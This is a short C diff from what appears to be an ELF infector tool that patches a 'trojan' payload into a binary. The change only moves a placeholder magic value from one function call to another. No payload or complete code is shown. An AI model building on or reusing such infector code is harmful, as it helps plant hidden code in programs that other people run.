@@ -67,9 +67,10 @@ static bool doit(const char *binfile, const char *trojan) {
 
     elf_t *elfo = elf_parse_file(file, fp, m1);
 
-    infect_t *inf = inf_load(elfo, trojanfp, m1);
+    long magic = (long)0x1122334455667788;
+    infect_t *inf = inf_load(elfo, trojanfp, m1, magic);
     if (inf_scan_segment(inf)) {
-        if ((rc = inf_load_and_patch(inf, (long)0x1122334455667788)) == true)
+        if ((rc = inf_load_and_patch(inf)) == true)
             printf("Done!\nTry running %s\n", file);
         else
             printf("Failed :(\n");
